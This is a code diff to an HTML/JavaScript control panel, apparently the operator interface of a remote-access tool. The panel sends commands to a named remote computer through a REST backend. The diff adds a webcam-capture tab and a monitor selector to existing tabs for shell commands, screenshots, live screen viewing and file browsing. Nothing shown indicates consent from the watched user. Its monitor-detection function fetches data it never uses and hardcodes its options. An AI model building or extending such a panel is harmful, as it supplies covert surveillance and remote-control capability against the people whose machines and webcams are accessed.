@@ -46,6 +46,8 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
 .files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
 .files .entry .sz{color:#8b949e;font-size:.75rem;white-space:nowrap}
 .files .entry .dt{color:#484f58;font-size:.75rem;white-space:nowrap}
+select.mon{background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;padding:.45rem;font-size:.85rem}
+select.mon:focus{outline:none;border-color:#58a6ff}
 
 </style>
 </head>
@@ -62,6 +64,7 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
     <div class="tab" onclick="switchTab(this,'screenshot')">Screenshot</div>
     <div class="tab" onclick="switchTab(this,'screen')">Screen</div>
     <div class="tab" onclick="switchTab(this,'files')">Files</div>
+    <div class="tab" onclick="switchTab(this,'webcam')">Webcam</div>
   </div>
   <div class="panel active" id="panel-cmd">
     <input class="cmd-input" id="cmdInput" placeholder="Type command and press Enter..." onkeydown="if(event.key==='Enter')runCmd()">
@@ -69,7 +72,8 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
     <div id="cmdErr" class="err" style="display:none"></div>
   </div>
   <div class="panel" id="panel-screenshot">
-    <div style="display:flex;gap:.5rem;margin-bottom:1rem">
+    <div style="display:flex;gap:.5rem;margin-bottom:1rem;align-items:center">
+      <select class="mon" id="monSelect"><option value="0">Monitor 1</option></select>
       <button class="btn btn-green" onclick="takeScreenshot()">Take Screenshot</button>
     </div>
     <div id="ssResult"><div class="loading">Click button to capture</div></div>
@@ -91,6 +95,13 @@ body{background:#0d1117;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-heig
       <div class="loading">Click a directory to browse</div>
     </div>
     <div id="filesErr" class="err" style="display:none"></div>
+  </div>
+  <div class="panel" id="panel-webcam">
+    <div style="display:flex;gap:.5rem;margin-bottom:1rem">
+      <button class="btn btn-green" onclick="takeWebcam()">Capture Webcam</button>
+    </div>
+    <div id="wcResult"><div class="loading">Click button to capture</div></div>
+    <div id="wcErr" class="err" style="display:none"></div>
   </div>
 </div>
 <script>
@@ -167,7 +178,20 @@ async function runCmd(){
 
 async function takeScreenshot(){
  const el=document.getElementById('ssResult');
- const res=await sendAndWait('screenshot','',el,'ssErr');
+ const mon=document.getElementById('monSelect').value;
+ const res=await sendAndWait('screenshot',mon,el,'ssErr');
+ if(res&&res.result){
+  el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
+ }else if(res){
+  el.innerHTML='<div class="loading">Empty result received</div>';
+ }
+}
+
+async function takeWebcam(){
+ const el=document.getElementById('wcResult');
+ const errEl=document.getElementById('wcErr');
+ errEl.style.display='none';
+ const res=await sendAndWait('webcam','',el,'wcErr');
  if(res&&res.result){
   el.innerHTML='<img class="screenshot" src="data:image/jpeg;base64,'+res.result+'">';
  }else if(res){
@@ -318,6 +342,16 @@ function stopScreen(){
 
 let filePath='';
 let fileLoading=false;
+
+// Detect monitors via C++ and populate dropdown
+(async function initMonitors(){
+ try{
+  const r=await fetch(SB+'/rest/v1/commands?computer=eq.'+encodeURIComponent(computer)+'&type=eq.screenshot&status=eq.done&order=id.desc&limit=1',H);
+ }catch{}
+ // Just add an "All monitors" option
+ const sel=document.getElementById('monSelect');
+ if(sel)sel.innerHTML='<option value="0">Monitor 1</option><option value="-1">All Monitors</option>';
+})();
 
 async function browseDir(path){
  if(fileLoading)return;
